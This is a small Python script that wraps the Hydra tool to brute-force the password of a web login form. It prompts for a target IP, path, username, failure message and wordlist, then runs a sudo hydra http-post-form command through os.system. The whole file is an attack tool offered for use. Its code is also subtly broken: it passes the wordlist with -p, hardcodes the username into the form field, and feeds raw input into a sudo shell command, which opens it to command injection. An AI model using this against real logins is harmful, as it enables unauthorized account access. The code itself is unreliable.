import os



username = input("Enter username:")
print("---------------------------")
print("Set Username to: " + username)
print("---------------------------")

cmd = 'clear'
os.system(cmd)

ip = input("Enter Ip:")
print("---------------------------")
print("Set ip to: " + ip)
print("---------------------------")

cmd = 'clear'
os.system(cmd)

method = "http-post-form"

location = input("Specify path to attack:")
print("---------------------------")
print("Set path to: " + location)
print("---------------------------")

cmd = 'clear'
os.system(cmd)


fail = input("Enter Failure Message: ")
print("----------------------------")
print("Set message to: " + fail)
print("----------------------------")

os.system(cmd)

wordls = input("Enter the path of the wordlist: ")
print("----------------------------")
print("set wordlist to: " + wordls)
print("----------------------------")
input("Press enter to start attack")

os.system(cmd)



hydra1 = 'sudo hydra -l '
hydra2 = ' -p '
hydra3 = ' "'
hydra4 = ':username='
hydra5 = '&password=^PASS^:'
hydra6 = '"'

os.system(hydra1 + username + hydra2 + wordls + ' ' + ip + ' ' + method + hydra3 + location + hydra4 + username + hydra5 + fail + hydra6)
